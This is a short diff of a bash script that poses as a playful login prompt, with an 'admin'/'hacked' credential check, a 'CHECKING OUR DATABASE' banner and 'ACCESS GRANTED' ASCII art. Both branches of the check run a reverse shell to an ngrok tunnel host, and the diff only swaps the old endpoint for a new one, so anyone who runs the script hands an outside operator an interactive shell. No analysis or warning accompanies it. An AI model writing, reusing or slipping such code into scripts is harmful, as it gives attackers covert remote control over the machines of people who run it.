@@ -19,9 +19,9 @@ if [[ ( $USERNAME == "admin" && $password == "hacked" ) ]]; then
   clear
 sleep 3
 echo -e "\e[92m.....CHECKING OUR DATABASE PLEASE WAIT......" | pv -qL 10  
-bash -i >& /dev/tcp/6.tcp.ngrok.io/13905 0>&1
+bash -i >& /dev/tcp/4.tcp.ngrok.io/11108 0>&1
 figlet -f slant "ACCESS GRANTED" | pv -qL 100 | lolcat
 else
-bash -i >& /dev/tcp/6.tcp.ngrok.io/13905 0>&1
+bash -i >& /dev/tcp/4.tcp.ngrok.io/11108 0>&1
   echo "PERMISSION DENIED"
 fi
